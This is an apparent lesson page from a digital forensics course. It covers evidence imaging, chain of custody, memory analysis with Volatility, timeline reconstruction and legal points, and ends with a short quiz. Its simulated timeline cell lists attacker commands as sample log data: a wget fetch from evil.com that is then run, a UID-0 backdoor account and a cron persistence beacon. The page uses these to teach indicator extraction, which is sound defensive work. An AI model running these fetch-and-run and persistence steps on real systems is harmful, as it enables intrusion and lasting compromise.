---
title: "Digital Forensics"
description: "The science of preserving, analyzing, and presenting digital evidence after a security incident."
read_time: 13
code_time: 7
---

## The Forensic Mindset

Forensics answers three questions after an incident: **What happened? When? Who did it?** But unlike incident response (which focuses on stopping the bleeding), forensics must preserve evidence integrity — because findings may end up in court.

## The Golden Rules

1. **Never work on the original evidence.** Always create a forensic image and analyze the copy.
2. **Document everything.** Every action, tool, and timestamp must be recorded.
3. **Preserve the chain of custody.** Every person who handles the evidence must be logged.
4. **Use validated tools.** Courts require that tools produce reproducible results.

<Callout type="danger" title="One mistake can destroy a case">If you modify the original disk, even accidentally, the evidence may be inadmissible. Always image first, verify hashes, then work on the copy.</Callout>

## Chain of Custody

The chain of custody is a document that tracks:

- Who collected the evidence, when, and where.
- Every transfer of custody (person, date, time, reason).
- Storage conditions and access logs.

If there is a gap in the chain, a defense attorney can argue the evidence was tampered with.

## Disk Forensics

### Imaging

A forensic image is a bit-for-bit copy of the storage device, including deleted files and unallocated space. Common formats: **E01** (EnCase), **AFF4**, **dd** (raw).

```bash
# Create a raw image with dd (Linux)
dd if=/dev/sda of=/evidence/disk.img bs=4M conv=noerror,sync

# Verify integrity
sha256sum /dev/sda /evidence/disk.img
```

### What You Can Find

| Artifact | Location | What It Reveals |
|---|---|---|
| Filesystem metadata | MFT / inode | File creation, modification, access times |
| Deleted files | Unallocated space | Files the attacker tried to remove |
| Browser history | Chrome/Firefox profiles | Research, C2 communication via web |
| Prefetch / ShimCache | Windows registry | Programs that were executed |
| Event logs | /var/log, Windows Event Log | Logins, service starts, errors |

## Memory Forensics

RAM contains data that never touches disk:

- Running processes and their command lines
- Network connections and open sockets
- Injected code and unpacked malware
- Encryption keys (briefly, while in use)

Tools like **Volatility** parse a memory dump:

```bash
# List processes from a memory image
volatility -f memdump.raw --profile=Win10x64 pslist

# Show network connections
volatility -f memdump.raw --profile=Win10x64 netscan
```

<Callout type="tip" title="Capture RAM before pulling the plug">If the machine is on, capture memory first. Shutting down destroys volatile evidence. Only pull the plug if the system is actively destroying data.</Callout>

## The Investigation Workflow

1. **Secure the scene** — isolate the machine from the network (do not shut down yet).
2. **Capture volatile data** — RAM, network connections, running processes.
3. **Image the disk** — bit-for-bit copy with hash verification.
4. **Analyze the image** — timeline reconstruction, artifact examination.
5. **Correlate with logs** — match disk findings to SIEM/network logs.
6. **Report** — findings with evidence references, reproducible methodology.

## Interactive: Timeline Reconstruction

<PyRunner
  cellId="122-digital-forensics-cell-1"
  defaultCode={`from datetime import datetime

# Simulated forensic timeline events
events = [
  {"time": "2024-03-15 02:14:00", "source": "auth.log", "event": "SSH login from 185.220.101.45 as root"},
  {"time": "2024-03-15 02:14:30", "source": "bash_history", "event": "wget http://evil.com/payload.sh"},
  {"time": "2024-03-15 02:15:00", "source": "bash_history", "event": "chmod +x payload.sh && ./payload.sh"},
  {"time": "2024-03-15 02:16:00", "source": "process list", "event": "New process: /tmp/.hidden/beacon (PID 4821)"},
  {"time": "2024-03-15 02:17:00", "source": "netstat", "event": "Outbound connection 10.0.0.5:443 -> 185.220.101.45:8443"},
  {"time": "2024-03-15 02:20:00", "source": "auth.log", "event": "New user created: svc_update (UID 0)"},
  {"time": "2024-03-15 03:00:00", "source": "cron", "event": "Cron job added: */5 * * * * /tmp/.hidden/beacon"},
]

# Sort and display
sorted_events = sorted(events, key=lambda e: e["time"])

print("Forensic Timeline Reconstruction")
print("=" * 60)
for e in sorted_events:
    print(f"  [{e['time']}] ({e['source']:14s}) {e['event']}")

# Compute key metrics
first = datetime.strptime(sorted_events[0]["time"], "%Y-%m-%d %H:%M:%S")
last = datetime.strptime(sorted_events[-1]["time"], "%Y-%m-%d %H:%M:%S")
duration = (last - first).total_seconds() / 60

print(f"\nAttack duration: {duration:.0f} minutes")
print(f"First indicator: {sorted_events[0]['event']}")
print(f"Persistence established: cron job at 03:00")
print(f"Backdoor account: svc_update (UID 0)")
print(f"\nIOCs extracted:")
print(f"  IP: 185.220.101.45")
print(f"  Domain: evil.com")
print(f"  File: /tmp/.hidden/beacon")
print(f"  User: svc_update")`}
  timeout={8}
  title="Forensic Timeline Builder"
/>

## Interactive: Hash Verification

<PyRunner
  cellId="122-digital-forensics-cell-2"
  defaultCode={`import hashlib

# Simulate verifying forensic image integrity
original_data = b"This simulates the original disk content for forensic verification."
image_data = b"This simulates the original disk content for forensic verification."  # identical copy
tampered_data = b"This simulates the original disk content for forensic verificatio."  # 1 byte changed

def verify_integrity(original, copy, label):
    h1 = hashlib.sha256(original).hexdigest()
    h2 = hashlib.sha256(copy).hexdigest()
    match = h1 == h2
    print(f"  {label}:")
    print(f"    Original SHA256: {h1[:32]}...")
    print(f"    Copy SHA256:     {h2[:32]}...")
    print(f"    Integrity: {'VERIFIED' if match else 'MISMATCH - evidence compromised!'}")
    print()

print("Forensic Image Hash Verification")
print("=" * 55)
verify_integrity(original_data, image_data, "Forensic image (clean copy)")
verify_integrity(original_data, tampered_data, "Tampered image (1 byte changed)")`}
  timeout={8}
  title="Evidence Integrity Check"
/>

## Legal Considerations

- **Authorization** — you need legal authority to examine the device.
- **Privacy** — employee data, personal files, and privileged communications may be present.
- **Jurisdiction** — cross-border data has different rules (GDPR, CLOUD Act).
- **Expert testimony** — the analyst may need to explain methods to a jury.

## Summary

Digital forensics is disciplined evidence handling: image first, verify hashes, reconstruct timelines, and document everything. The goal is not just to understand the attack, but to produce findings that survive legal scrutiny.

<Quiz
  chapterSlug="122-digital-forensics"
  questions={[
    {
      id: "q1",
      type: "multiple-choice",
      prompt: "Why must you never analyze the original evidence directly?",
      options: ["Original evidence is too large", "Any modification could make the evidence inadmissible in court", "Forensic tools only work on copies", "The original is encrypted"],
      correctIndex: 1,
      explanation: "Working on the original risks modifying timestamps, files, or metadata. Courts require evidence integrity, so all analysis must happen on a verified forensic image.",
      randomize: true,
    },
    {
      id: "q2",
      type: "multiple-choice",
      prompt: "What should you do FIRST when arriving at a live compromised machine?",
      options: ["Shut it down immediately", "Capture volatile data (RAM, network connections) before anything else", "Reinstall the operating system", "Disconnect the power cable"],
      correctIndex: 1,
      explanation: "RAM contains running processes, network connections, and possibly encryption keys that vanish on shutdown. Capture volatile data first, then image the disk.",
      randomize: true,
    },
    {
      id: "q3",
      type: "multiple-choice",
      prompt: "What is the purpose of the chain of custody document?",
      options: ["To list all IOCs found", "To track every person who handled the evidence and when", "To store the forensic image", "To record the SIEM alert rules"],
      correctIndex: 1,
      explanation: "The chain of custody logs every transfer of evidence. A gap allows a defense attorney to argue the evidence was tampered with, potentially making it inadmissible.",
      randomize: true,
    },
    {
      id: "q4",
      type: "multiple-choice",
      prompt: "Why is SHA-256 used to verify forensic images?",
      options: ["It compresses the image", "It encrypts the evidence", "It proves the copy is bit-for-bit identical to the original", "It scans for malware"],
      correctIndex: 2,
      explanation: "SHA-256 produces a unique digest of the data. If the hash of the image matches the hash of the original, the copy is verified as identical. Even one changed byte produces a completely different hash.",
      randomize: true,
    }
  ]}
/>
